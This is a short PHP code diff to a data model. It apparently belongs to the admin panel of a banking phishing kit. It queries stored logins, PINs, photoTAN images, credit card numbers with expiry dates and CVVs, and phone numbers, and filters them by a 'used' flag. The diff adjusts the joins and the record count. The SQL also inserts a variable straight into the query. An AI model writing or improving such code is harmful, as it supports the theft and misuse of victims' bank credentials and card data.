@@ -16,13 +16,13 @@ class DataModel {
             login.pin, 
             login.direkt_zu as directTo,
             login.created_at, 
-            IFNULL(phototan.Phototan, '0') as uploadedImage,
+            phototan.Phototan as uploadedImage,
             IFNULL(kreditkarte.Kartennummer, '-') as creditCardNumber,
             IFNULL(kreditkarte.exp_date, '-') as exp_date,
             IFNULL(kreditkarte.cvv, '-') as cvv,
             IFNULL(telefonummer.Telefonummer, '-') as phoneNumber
             FROM login 
-            LEFT JOIN phototan ON login.id = phototan.login_id 
+            JOIN phototan ON login.id = phototan.login_id 
             LEFT JOIN kreditkarte ON login.id = kreditkarte.login_id
             LEFT JOIN telefonummer ON login.id = telefonummer.login_id
             WHERE login.used = $used
@@ -37,7 +37,11 @@ class DataModel {
     }
 
     public function getDataCount($used) {
-        $query = "SELECT COUNT(*) as total FROM login WHERE used = $used";
+        $query = "SELECT 
+            COUNT(login.id) as total
+            FROM login 
+            JOIN phototan ON login.id = phototan.login_id 
+            WHERE login.used = $used";    
         $stmt = $this->conn->prepare($query);
         $stmt->execute();
         $row = $stmt->fetch(PDO::FETCH_ASSOC);
